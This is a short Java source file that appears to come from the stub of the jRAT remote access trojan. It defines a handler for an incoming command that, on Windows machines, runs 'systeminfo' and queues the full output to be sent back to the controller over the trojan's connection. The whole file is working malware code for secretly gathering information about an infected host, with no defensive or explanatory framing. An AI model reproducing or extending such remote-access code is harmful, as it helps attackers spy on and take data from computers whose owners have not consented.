package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet57RawComputerInfo;

import com.redpois0n.common.OperatingSystem;


public class Packet83WinSysInfo extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Process p = Runtime.getRuntime().exec("systeminfo");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			
			String info = "";
			String line;

			while ((line = reader.readLine()) != null) {
				info += line + "\n";
			}
			
			Connection.addToSendQueue(new Packet57RawComputerInfo(info));
		}
	}

}
